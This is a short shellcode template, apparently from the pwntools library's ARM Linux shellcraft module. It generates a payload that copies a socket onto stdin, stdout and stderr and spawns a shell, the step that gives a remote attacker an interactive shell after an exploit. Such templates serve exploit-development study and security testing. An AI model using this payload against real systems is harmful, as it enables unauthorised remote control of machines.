<% from pwnlib.shellcraft import arm, common %>
<%page args="sock = None"/>
<%docstring>
	Args: [sock (imm/reg) = None]
	Duplicates sock to stdin, stdout and stderr and spawns a shell.
</%docstring>

${arm.linux.dup(sock)}
${arm.linux.sh()}
